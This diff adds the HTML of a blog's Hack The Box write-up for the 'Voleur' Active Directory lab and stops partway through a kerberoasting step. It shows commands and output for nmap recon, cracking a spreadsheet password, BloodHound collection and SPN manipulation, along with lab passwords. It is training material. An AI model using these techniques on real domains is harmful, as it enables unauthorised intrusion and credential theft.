@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HTB: Voleur | Chaelsoo&#39;s blog</title>
+<meta property="og:title" content="HTB: Voleur | Chaelsoo&#39;s blog" />
+<meta name="twitter:title" content="HTB: Voleur | Chaelsoo&#39;s blog" />
+<meta itemprop="name" content="HTB: Voleur | Chaelsoo&#39;s blog" />
+<meta name="application-name" content="HTB: Voleur | Chaelsoo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="A Medium Windows box where NTLM is fully disabled and a leaked spreadsheet in an SMB share hands you passwords for accounts you can&#39;t yet reach. The chain runs through targeted kerberoasting, tombstone reanimation, and DPAPI blobs left in a deleted user&#39;s archived profile.">
+<meta itemprop="description" content="A Medium Windows box where NTLM is fully disabled and a leaked spreadsheet in an SMB share hands you passwords for accounts you can&#39;t yet reach. The chain runs through targeted kerberoasting, tombstone reanimation, and DPAPI blobs left in a deleted user&#39;s archived profile." />
+<meta property="og:description" content="A Medium Windows box where NTLM is fully disabled and a leaked spreadsheet in an SMB share hands you passwords for accounts you can&#39;t yet reach. The chain runs through targeted kerberoasting, tombstone reanimation, and DPAPI blobs left in a deleted user&#39;s archived profile." />
+<meta name="twitter:description" content="A Medium Windows box where NTLM is fully disabled and a leaked spreadsheet in an SMB share hands you passwords for accounts you can&#39;t yet reach. The chain runs through targeted kerberoasting, tombstone reanimation, and DPAPI blobs left in a deleted user&#39;s archived profile." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-voleur/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/htb-voleur/">
+  <meta property="og:site_name" content="Chaelsoo&#39;s blog">
+  <meta property="og:title" content="HTB: Voleur">
+  <meta property="og:description" content="A Medium Windows box where NTLM is fully disabled and a leaked spreadsheet in an SMB share hands you passwords for accounts you can&#39;t yet reach. The chain runs through targeted kerberoasting, tombstone reanimation, and DPAPI blobs left in a deleted user&#39;s archived profile.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-07T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-07T00:00:00+00:00">
+    <meta property="article:tag" content="Ntlm-Disabled">
+    <meta property="article:tag" content="Dpapi">
+    <meta property="article:tag" content="Reanimate-Tombstone">
+    <meta property="article:tag" content="Kerberoasting">
+    <meta property="article:tag" content="Windows">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Voleur">
+  <meta name="twitter:description" content="A Medium Windows box where NTLM is fully disabled and a leaked spreadsheet in an SMB share hands you passwords for accounts you can&#39;t yet reach. The chain runs through targeted kerberoasting, tombstone reanimation, and DPAPI blobs left in a deleted user&#39;s archived profile.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/htb-voleur/">
+    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HTB: Voleur</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-06-07T00:00:00&#43;00:00" itemprop="datePublished"> 7 Jun 2026 </time>
+                </div>
+                
+            </header>
+            
+            <img src="/images/writeups/htb-voleur/htb-voleur-pwned.png" alt="HTB: Voleur" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#the-spreadsheet-in-the-it-share">The Spreadsheet in the IT Share</a></li>
+    <li><a href="#targeted-kerberoasting-via-writespn">Targeted Kerberoasting via WriteSPN</a></li>
+    <li><a href="#dead-end-genericwrite-on-lacey">Dead End: GenericWrite on Lacey</a></li>
+    <li><a href="#reanimate-tombstone-bringing-todd-back">Reanimate-Tombstone: Bringing Todd Back</a></li>
+    <li><a href="#dpapi-todds-archived-credentials">DPAPI: Todd&rsquo;s Archived Credentials</a></li>
+    <li><a href="#jeremy-the-ssh-key-and-the-backup">Jeremy, the SSH Key, and the Backup</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>Windows AD box where NTLM authentication is completely disabled. That single constraint changes everything about how you operate: no pass-the-hash, no NTLM relay, every tool needs a TGT and Kerberos must be properly configured. The box hands you starting credentials upfront but then makes you earn the rest through a chain that&rsquo;s worth understanding. A spreadsheet locked in an SMB share leaks passwords for accounts you can&rsquo;t use yet. A service account with WriteSPN lets you kerberoast your way to WinRM. A group called Restore_Users hints at a deleted employee. And once you bring that employee back from tombstone, his archived DPAPI blobs hand you the next account&rsquo;s credentials without any cracking at all.</p>
+<p>&ldquo;Voleur&rdquo; is French for thief. Appropriate.</p>
+<h2 id="recon">Recon</h2>
+<p>10.129.232.130, domain <code>voleur.htb</code>, hostname <code>DC</code>. Standard AD ports: DNS, Kerberos, LDAP, SMB, WinRM on 5985. Also an SSH server on port 2222, running OpenSSH on Ubuntu - WSL, as it turns out.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ sudo nmap -sV -sC -T4 <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-07 07:32 +0100
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.232.130
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.086s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">987</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2026-06-07 14:32:22Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: voleur.htb, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: voleur.htb, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OSs: Windows, Linux<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>The box starts with credentials: <code>ryan.naylor:HollowOct31Nyt</code>. First thing I tried was SMB:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ nxc smb <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.232.130  <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:voleur.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.232.130  <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> voleur.htb<span class="se">\r</span>yan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
+</span></span></code></pre></div><p><code>NTLM:False</code> and <code>STATUS_NOT_SUPPORTED</code>. NTLM authentication is disabled domain-wide. This means every single tool that authenticates over SMB, LDAP, or WinRM needs to use Kerberos instead. No NTLM means no pass-the-hash later either. Everything goes through TGTs.</p>
+<p>To operate in a Kerberos-only environment, <code>/etc/krb5.conf</code> needs to point at the right KDC. The nmap scan showed an 8-hour clock skew between my machine and the DC, so every Kerberos call needs <code>faketime -f '+8h'</code> to put the timestamps in range:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>libdefaults<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">default_realm</span> <span class="o">=</span> VOLEUR.HTB
+</span></span><span class="line"><span class="cl">    <span class="nv">dns_lookup_realm</span> <span class="o">=</span> <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">dns_lookup_kdc</span> <span class="o">=</span> <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">ticket_lifetime</span> <span class="o">=</span> 24h
+</span></span><span class="line"><span class="cl">    <span class="nv">renew_lifetime</span> <span class="o">=</span> 7d
+</span></span><span class="line"><span class="cl">    <span class="nv">forwardable</span> <span class="o">=</span> <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>realms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    VOLEUR.HTB <span class="o">=</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">kdc</span> <span class="o">=</span> dc.voleur.htb
+</span></span><span class="line"><span class="cl">        <span class="nv">admin_server</span> <span class="o">=</span> dc.voleur.htb
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>domain_realm<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    .voleur.htb <span class="o">=</span> VOLEUR.HTB
+</span></span><span class="line"><span class="cl">    voleur.htb <span class="o">=</span> VOLEUR.HTB
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> getTGT.py voleur.htb/ryan.naylor:<span class="s1">&#39;HollowOct31Nyt&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in ryan.naylor.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/voleur ❯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/ryan.naylor.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/voleur ❯ klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:/home/kanyo/work/htb/labs/voleur/ryan.naylor.ccache
+</span></span><span class="line"><span class="cl">Default principal: ryan.naylor@VOLEUR.HTB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting       Expires              Service principal
+</span></span><span class="line"><span class="cl">06/07/2026 16:09:04  06/08/2026 02:09:04  krbtgt/VOLEUR.HTB@VOLEUR.HTB
+</span></span><span class="line"><span class="cl">	renew <span class="k">until</span> 06/08/2026 16:09:03
+</span></span></code></pre></div><p>BloodHound collection over LDAP with Kerberos auth:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ nxc ldap voleur.htb -k --use-kcache --bloodhound -c All --dns-server 10.129.232.130
+</span></span><span class="line"><span class="cl">LDAP        voleur.htb      <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:VOLEUR.HTB<span class="o">)</span> <span class="o">(</span>signing:None<span class="o">)</span> <span class="o">(</span>channel binding:No TLS cert<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        voleur.htb      <span class="m">389</span>    DC               <span class="o">[</span>+<span class="o">]</span> VOLEUR.HTB<span class="se">\r</span>yan.naylor from ccache
+</span></span><span class="line"><span class="cl">LDAP        voleur.htb      <span class="m">389</span>    DC               Resolved collection methods: localadmin, objectprops, acl, psremote, container, dcom, rdp, group, session, trusts
+</span></span><span class="line"><span class="cl">LDAP        voleur.htb      <span class="m">389</span>    DC               Using kerberos auth without ccache, getting TGT
+</span></span><span class="line"><span class="cl">LDAP        voleur.htb      <span class="m">389</span>    DC               Using kerberos auth from ccache
+</span></span><span class="line"><span class="cl">LDAP        voleur.htb      <span class="m">389</span>    DC               Done in 0M 17S
+</span></span><span class="line"><span class="cl">LDAP        voleur.htb      <span class="m">389</span>    DC               Compressing output into /home/kanyo/.nxc/logs/DC_voleur.htb_2026-06-07_161131_bloodhound.zip
+</span></span></code></pre></div><p>Ryan is a member of First-Line Technicians - a custom group, which usually means it has some permission wired to it.</p>
+<p><img src="/images/writeups/htb-voleur/bloodhound-ryan-first-line-technicians.png" alt="BloodHound graph showing RYAN.NAYLOR is MemberOf FIRST-LINE TECHNICIANS and DOMAIN USERS groups"></p>
+<h2 id="the-spreadsheet-in-the-it-share">The Spreadsheet in the IT Share</h2>
+<p>First-Line Technicians group gave read access to the IT share. Listing shares as ryan via Kerberos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ✗ smbclient.py -k -no-pass dc.voleur.htb
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="nb">help</span> <span class="k">for</span> list of commands
+</span></span><span class="line"><span class="cl"><span class="c1"># shares</span>
+</span></span><span class="line"><span class="cl">Share Name                Type            Comment
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">ADMIN$                    DISK <span class="o">(</span>SPECIAL<span class="o">)</span>  Remote Admin
+</span></span><span class="line"><span class="cl">C$                        DISK <span class="o">(</span>SPECIAL<span class="o">)</span>  Default share
+</span></span><span class="line"><span class="cl">Finance                   DISK            
+</span></span><span class="line"><span class="cl">HR                        DISK            
+</span></span><span class="line"><span class="cl">IPC$                      IPC <span class="o">(</span>SPECIAL<span class="o">)</span>   Remote IPC
+</span></span><span class="line"><span class="cl">IT                        DISK            
+</span></span><span class="line"><span class="cl">NETLOGON                  DISK            Logon server share 
+</span></span><span class="line"><span class="cl">SYSVOL                    DISK            Logon server share
+</span></span></code></pre></div><p>Inside IT there was a file: <code>Access_Review.xlsx</code>. Password protected.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ✗ office2john Access_Review.xlsx &gt; access.hash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/voleur ❯ john access.hash --wordlist<span class="o">=</span>~/tools/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Warning: detected <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">&#34;Office&#34;</span>, but the string is also recognized as <span class="s2">&#34;office-opencl&#34;</span>
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>Office, 2007/2010/2013 <span class="o">[</span>SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>MS Office version<span class="o">)</span> is <span class="m">2013</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Cost <span class="m">2</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">100000</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">20</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">football1        <span class="o">(</span>Access_Review.xlsx<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:01 DONE <span class="o">(</span>2026-06-07 08:40<span class="o">)</span> 0.5555g/s 444.4p/s 444.4c/s 444.4C/s dreamer..martha
+</span></span><span class="line"><span class="cl">Session completed
+</span></span></code></pre></div><p>The spreadsheet was an account access review document. Everything in it:</p>
+<p><img src="/images/writeups/htb-voleur/xlsx-access-review-accounts.png" alt="Access_Review.xlsx spreadsheet showing user accounts, job titles, permissions, and passwords for the voleur.htb domain"></p>
+<table>
+  <thead>
+      <tr>
+          <th>Account</th>
+          <th>Type</th>
+          <th>Password</th>
+          <th>Notes</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Ryan.Naylor</td>
+          <td>User</td>
+          <td><code>HollowOct31Nyt</code></td>
+          <td>First-Line Technician, Kerberos pre-auth disabled</td>
+      </tr>
+      <tr>
+          <td>Marie.Bryant</td>
+          <td>User</td>
+          <td>unknown</td>
+          <td>First-Line Technician, SMB only</td>
+      </tr>
+      <tr>
+          <td>Lacey.Miller</td>
+          <td>User</td>
+          <td>unknown</td>
+          <td>Second-Line Technician, Remote Management Users</td>
+      </tr>
+      <tr>
+          <td>Todd.Wolfe</td>
+          <td>User</td>
+          <td><code>NightT1meP1dg3on14</code></td>
+          <td>Leaver, account &ldquo;deleted&rdquo;, Second-Line Technician</td>
+      </tr>
+      <tr>
+          <td>Jeremy.Combs</td>
+          <td>User</td>
+          <td>unknown</td>
+          <td>Third-Line Technician, Remote Management Users, Software</td>
+      </tr>
+      <tr>
+          <td>Administrator</td>
+          <td>User</td>
+          <td>unknown</td>
+          <td>Domain Admin, flagged as not for daily use</td>
+      </tr>
+      <tr>
+          <td>svc_backup</td>
+          <td>Service</td>
+          <td>unknown</td>
+          <td>Windows Backup, speak to Jeremy</td>
+      </tr>
+      <tr>
+          <td>svc_ldap</td>
+          <td>Service</td>
+          <td><code>M1XyC9pW7qT5Vn</code></td>
+          <td>LDAP Services</td>
+      </tr>
+      <tr>
+          <td>svc_iis</td>
+          <td>Service</td>
+          <td><code>N5pXyW1VqM7CZ8</code></td>
+          <td>IIS Administration</td>
+      </tr>
+      <tr>
+          <td>svc_winrm</td>
+          <td>Service</td>
+          <td>unknown</td>
+          <td>Remote Management, recently reset by Lacey</td>
+      </tr>
+  </tbody>
+</table>
+<p>A few things jump out immediately. <code>svc_ldap</code> has a plaintext password. <code>Todd.Wolfe</code> is flagged as a leaver with his account &ldquo;deleted&rdquo; - and we already have his password. BloodHound showed exactly what <code>svc_ldap</code> can do with those credentials:</p>
+<p><img src="/images/writeups/htb-voleur/bloodhound-svcldap-restore-users-chain.png" alt="BloodHound graph showing SVC_LDAP is MemberOf RESTORE_USERS which has GenericWrite over LACEY.MILLER and the SECOND-LINE SUPPORT OU, and SVC_LDAP has WriteSPN over SVC_WINRM"></p>
+<p>Two paths: <code>svc_ldap</code> has <code>WriteSPN</code> directly on <code>svc_winrm</code>, and via <code>Restore_Users</code> group membership it has <code>GenericWrite</code> over <code>lacey.miller</code> and the Second-Line Support Technicians OU. The group name &ldquo;Restore_Users&rdquo; combined with Todd&rsquo;s deleted account was a strong signal.</p>
+<h2 id="targeted-kerberoasting-via-writespn">Targeted Kerberoasting via WriteSPN</h2>
+<p>WriteSPN is an AD permission that lets you add or modify a user account&rsquo;s <code>servicePrincipalName</code> attribute. This matters because the Kerberos protocol treats any account with an SPN as a service. When you request a TGS ticket for a service, the KDC encrypts part of the response with that account&rsquo;s password hash. That encrypted blob is the kerberoastable hash - you take it offline and crack it.</p>
+<p><code>svc_ldap</code> has WriteSPN over <code>svc_winrm</code>. That means I can register a fake SPN on svc_winrm, request a TGS for it, and get a crackable hash. First I needed a TGT as svc_ldap:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> getTGT.py voleur.htb/svc_ldap:<span class="s1">&#39;M1XyC9pW7qT5Vn&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in svc_ldap.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">…/labs/voleur ❯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/svc_ldap.ccache
+</span></span></code></pre></div><p>Set a fake SPN on svc_winrm:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ✗ faketime -f <span class="s1">&#39;+8h&#39;</span> bloodyAD -d voleur.htb -k --host dc.voleur.htb <span class="nb">set</span> object svc_winrm servicePrincipalName -v <span class="s1">&#39;fake/dc.voleur.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> svc_winrm<span class="err">&#39;</span>s servicePrincipalName has been updated
+</span></span></code></pre></div><p>Request the TGS:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/voleur ❯ faketime -f <span class="s1">&#39;+8h&#39;</span> GetUserSPNs.py -k -no-pass -dc-host dc.voleur.htb voleur.htb/svc_ldap -request-user svc_winrm
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ServicePrincipalName  Name       MemberOf                                                PasswordLastSet             LastLogon                   Delegation 
